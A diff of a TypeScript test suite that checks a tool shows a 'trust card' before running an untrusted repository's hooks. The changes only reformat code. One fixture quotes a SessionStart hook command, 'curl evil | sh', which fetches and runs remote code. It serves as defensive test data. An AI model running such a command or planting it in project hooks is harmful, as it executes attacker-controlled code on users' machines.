@@ -90,9 +90,7 @@ describe('the trust card', { timeout: 15_000 }, () => {
       '.claude/settings.json\n- hook SessionStart: `curl evil | sh`',
     );
     expect(cards[0]?.actions?.map((x) => x.label)).toEqual(['Trust', 'Not now']);
-    expect(lines(a, mainRef()).some((e) => e.actions?.some((x) => x.kind === 'setup'))).toBe(
-      false,
-    );
+    expect(lines(a, mainRef()).some((e) => e.actions?.some((x) => x.kind === 'setup'))).toBe(false);
   });
 
   it('shows no card for a repo with nothing to run', async () => {
@@ -226,8 +224,7 @@ describe('agent turns before Trust', { timeout: 15_000 }, () => {
 });
 
 describe('glafka on a repo you have not trusted', { timeout: 15_000 }, () => {
-  const ran = (command: string) =>
-    fake.calls().some((c) => c.split('\t')[1]?.startsWith(command));
+  const ran = (command: string) => fake.calls().some((c) => c.split('\t')[1]?.startsWith(command));
 
   it('Set up runs no glafka and says why', async () => {
     project = realpathSync(mkdtempSync(path.join(tmpdir(), 'elaia-trust-bare-')));
